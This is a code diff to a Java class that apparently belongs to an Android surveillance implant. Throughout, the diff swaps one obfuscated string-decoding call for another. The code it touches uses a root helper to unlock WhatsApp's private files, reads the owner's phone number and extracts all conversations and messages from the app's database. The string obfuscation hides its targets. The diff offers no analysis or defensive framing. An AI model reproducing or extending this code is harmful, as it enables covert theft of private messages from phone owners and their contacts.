@@ -138,7 +138,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		 * </string> </map>
 		 */
 
-		String filename = M.d("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
+		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
 		try {
 			// f_2=/system/bin/rilcapsvd pzm 777
 			Path.unprotect(filename, 2, true);
@@ -167,7 +167,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
 				}
 				// f_e=com.whatsapp.RegisterPhone.phone_number
-				if (item != null && M.d("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
+				if (item != null && M.e("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
 					}
@@ -212,9 +212,9 @@ public class ChatWhatsapp extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			// f.0=/data/data/com.whatsapp/databases
-			String dbDir = M.d("/data/data/com.whatsapp/databases");
+			String dbDir = M.e("/data/data/com.whatsapp/databases");
 			// f.1=/msgstore.db
-			String dbFile = M.d("/msgstore.db");
+			String dbFile = M.e("/msgstore.db");
 
 			if (Path.unprotect(dbDir, dbFile, true)) {
 
@@ -279,8 +279,8 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f_f=remote_resources
-		String[] projection = { M.d("_id"), M.d("remote_resource") };
-		String selection = M.d("key_remote_jid") + "='" + conversation + "'";
+		String[] projection = { M.e("_id"), M.e("remote_resource") };
+		String selection = M.e("key_remote_jid") + "='" + conversation + "'";
 
 		// final Set<String> remotes = new HashSet<String>();
 		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
@@ -300,7 +300,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		GenericSqliteHelper helper = new GenericSqliteHelper(db);
 		// f_a = messages
-		helper.traverseRecords(M.d("messages"), visitor);
+		helper.traverseRecords(M.e("messages"), visitor);
 
 	}
 
@@ -322,20 +322,20 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.3=chat_list
-		queryBuilderIndex.setTables(M.d("chat_list"));
+		queryBuilderIndex.setTables(M.e("chat_list"));
 		// queryBuilder.appendWhere(inWhere);
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f.6=message_table_id
-		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("message_table_id") };
+		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
 			// f.5=key_remote_jid
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.d("key_remote_jid")));
+			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.e("key_remote_jid")));
 			// f.6=message_table_id
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.d("message_table_id")));
+			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.e("message_table_id")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
 			}
@@ -387,20 +387,20 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.a=messages
-		queryBuilderIndex.setTables(M.d("messages"));
+		queryBuilderIndex.setTables(M.e("messages"));
 		// f.4=_id
 		// f.5=key_remote_jid
-		queryBuilderIndex.appendWhere(M.d("key_remote_jid") + " = '" + conversation + "' AND " + M.d("_id") + " > "
+		queryBuilderIndex.appendWhere(M.e("key_remote_jid") + " = '" + conversation + "' AND " + M.e("_id") + " > "
 				+ lastReadIndex);
 		// f.7=data
 		// f_b=timestamp
 		// f_c=key_from_me
-		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("data"), M.d("timestamp"), M.d("key_from_me"),
+		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),
 				"remote_resource" };
 
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
 		// AND key_remote_jid>$lastReadIndex
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.d("_id"));
+		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("_id"));
 
 		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		int lastRead = lastReadIndex;
@@ -466,7 +466,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			return null;
 		}
 		// f_9=@s.whatsapp.net
-		return remote.replaceAll(M.d("@s.whatsapp.net"), "");
+		return remote.replaceAll(M.e("@s.whatsapp.net"), "");
 	}
 
 }
